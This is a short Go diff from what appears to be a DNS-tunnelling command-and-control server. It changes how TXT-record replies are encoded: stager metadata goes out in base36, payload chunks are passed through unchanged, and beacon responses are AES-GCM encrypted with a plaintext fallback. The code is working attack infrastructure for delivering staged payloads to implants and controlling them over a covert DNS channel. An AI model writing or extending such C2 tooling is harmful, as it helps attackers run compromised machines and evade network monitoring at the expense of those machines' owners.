@@ -230,11 +230,24 @@ func handleQuery(packet []byte, cfg Config, clientIP string) ([]byte, error) {
 					})
 				}
 
-			case 16: // TXT record - encode response with AES-GCM + base36
-				encoded, encErr := encryptAndEncode(c2Response, c2Manager.aesKey)
-				if encErr != nil {
-					// Fallback to plain response if encryption fails
+			case 16: // TXT record - encode response
+				var encoded string
+
+				// Check if this is a stager response
+				if strings.HasPrefix(c2Response, "META|") {
+					// META response - use base36 encoding
+					encoded = base36EncodeString(c2Response)
+				} else if strings.HasPrefix(c2Response, "CHUNK|") {
+					// CHUNK response - data is already base64 encoded, send as-is
 					encoded = c2Response
+				} else {
+					// Beacon response - use AES-GCM + base36
+					var encErr error
+					encoded, encErr = encryptAndEncode(c2Response, c2Manager.aesKey)
+					if encErr != nil {
+						// Fallback to plain response if encryption fails
+						encoded = c2Response
+					}
 				}
 
 				// TXT records need proper length-prefixed format
